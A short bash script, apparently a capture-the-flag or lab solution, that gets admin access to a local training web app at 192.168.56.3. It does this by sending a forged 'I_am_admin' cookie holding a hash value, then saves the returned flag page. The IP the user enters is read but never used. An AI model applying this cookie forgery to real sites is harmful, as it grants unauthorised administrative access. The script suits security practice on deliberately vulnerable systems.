#!/bin/bash

echo input the IP address to inspect \(default IP address 192.168.56.3\):
read ip
# 192.168.56.3

if [ -z ${ip} ];
then
  ip="192.168.56.3"
fi

# echo "${ip}"
url="http://"${ip}"/?page=member"
# echo "${url}"

curl -s --cookie 'I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://192.168.56.3' -o flag.html
open flag.html
